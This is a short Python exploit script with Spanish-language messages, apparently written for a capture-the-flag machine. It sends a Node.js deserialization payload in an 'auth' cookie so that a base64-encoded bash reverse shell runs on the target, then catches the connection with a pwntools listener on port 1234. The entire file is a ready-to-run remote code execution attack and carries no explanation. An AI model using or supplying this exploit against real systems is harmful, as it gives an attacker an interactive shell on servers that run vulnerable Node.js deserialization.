import requests,sys,base64
from pwn import *
from os import system

def def_handler(sig, frame):
    print("\n\n[!] saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
    print(f'[!] Uso: python3 {sys.argv[0]} "Tu IP"\n' )
    sys.exit(1)

Host_ip = sys.argv[1]
Target_ip = 'http://10.10.11.139:5000'
s = requests.Session()


def encode_all(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def unserialize_attack():

    reverse = f'bash -i >& /dev/tcp/{Host_ip}/1234 0>&1'
    reverse_bytes = reverse.encode("ascii")
    base64_bytes = base64.b64encode(reverse_bytes)
    reversebase64 = base64_bytes.decode("ascii")

    payload= encode_all("""{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('echo %s| base64 -d | bash', function(error, stdout, stderr) { console.log(stdout) });}()"}""" % reversebase64)
    cookie = f'auth ={payload}' 
    headers = {
    "Cookie": cookie
    }   
    r = s.get(Target_ip,headers=headers)

if __name__ == '__main__':
    
    threading.Thread(target=unserialize_attack, args=()).start()
    shell = listen(1234,timeout=10).wait_for_connection()
    shell.interactive()
